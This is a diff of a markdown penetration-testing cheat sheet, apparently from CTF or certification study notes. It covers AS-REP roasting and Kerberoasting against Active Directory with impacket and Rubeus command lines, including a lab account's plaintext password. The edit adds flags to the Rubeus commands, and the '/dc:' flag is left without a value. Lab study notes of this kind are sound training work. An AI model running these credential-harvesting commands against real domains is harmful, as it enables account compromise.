@@ -474,7 +474,7 @@ impacket-GetNPUsers HTB.local/ -no-pass -dc-ip 10.10.10.161 -usersfile username.
 impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
 
 # Rubeus
-.\Rubeus.exe asreproast /nowrap
+.\Rubeus.exe asreproast /nowrap /dc:
 ```
 #### Kerberoasting 
 ```bash
@@ -482,7 +482,7 @@ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast
 impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -save -outputfile tgs.hash
 
 # Rubeus
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+.\Rubeus.exe kerberoast /nowrap /outfile:hashes.kerberoast /dc:
 ```
 #### DCsync
 ```bash
